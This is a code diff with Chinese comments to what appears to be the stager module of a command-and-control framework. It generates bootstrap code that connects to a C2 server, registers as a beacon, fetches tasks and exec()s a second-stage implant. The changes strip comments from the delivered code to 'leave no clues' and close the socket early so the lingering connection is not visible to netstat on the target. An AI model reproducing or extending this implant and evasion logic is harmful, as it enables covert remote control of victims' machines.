@@ -23,15 +23,25 @@ MODULE = {
 _DEFAULT_OUT = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "s_modules", "output")
 
 # 引导逻辑: 注册(随机 id) → welcome → FETCH → 收 TASKS → exec init 任务(第二段)
-# 注意: relay_code 生成的密钥名是 _SK(server_key)/_AK(agent_key), 与 server 通信用 _SK
+#
+# 下发的引导代码**不带任何注释**（体积 + 不留线索），两条"为什么这么写"的
+# 维护知识记录在这里（只存在于服务端源码，不下发）:
+#
+# 1) 同 id 语义: 先把引导 id 存进全局 BEACON_ID, 第二段（完整植入物）exec 时
+#    复用同一 id 注册 —— 否则新 id 会让 server 视为新 beacon 再次下发 stage,
+#    二次 exec 重置 _KNOWN/_PENDING/_ACTIVE 并泄漏线程（2026-08-27 修复）。
+# 2) 先关连接再交接: exec 之后控制权进入二阶段主循环、永不返回，下面 finally
+#    的 u.close() 执行不到 → 目标机长期留一条 CLOSE-WAIT（C2 侧对应
+#    FIN-WAIT-2），netstat 一眼可见。帧已在内存，关掉不影响交接；二阶段自己
+#    会立即开新连接回连（2026-09-27 修复）。
+#
+# relay_code 生成的密钥名是 _SK(server_key)/_AK(agent_key)；引导只与 server 用
+# _SK 通信 → 传 with_agent_key=False，_AK/_VIA 两行不再下发。
 _STAGER_TAIL = '''
 u=a.socket()
 try:
  u.settimeout(20);u.connect((_SH,_SP))
  u.sendall(l.token_bytes(256))
- # 同 id 语义: 先把引导 id 存入全局 BEACON_ID, 第二段(完整植入物)exec 时
- # 模板复用同一 id 注册——否则新 id 触发 server 再次下发 stage, 二次 exec
- # 重置 _KNOWN/_PENDING/_ACTIVE 并泄漏线程(2026-08-27 修复)
  globals().setdefault("BEACON_ID", l.token_hex(8))
  S(u,e.dumps({"type":"register","version":2,"role":"beacon","id":globals().get("BEACON_ID"),"batch":True}).encode(),_SK)
  w=R(u,_SK)
@@ -40,6 +50,8 @@ try:
  m=e.loads(R(u,_SK).decode())
  for _t in (m.get("tasks") or []):
   if _t.get("init"):
+   try:u.close()
+   except:pass
    exec(_t["code"],globals())
 except Exception as _e:
  print("stager-err:",_e)
@@ -73,7 +85,8 @@ def run(host, port, server_key_hex=None, out_dir=None):
     agent_key = secrets.token_bytes(32)
     code = relay_code(str(list(server_key)).replace(" ", ""),
                       str(list(agent_key)).replace(" ", ""),
-                      host, port, "agent_stager", long_lived=False)
+                      host, port, "agent_stager", long_lived=False,
+                      with_agent_key=False)
     # 复用加密函数头(import + 密钥 + E/S/R/D), 追加引导逻辑
     head = code.split("def relay_tx")[0]
     stager = head + _STAGER_TAIL
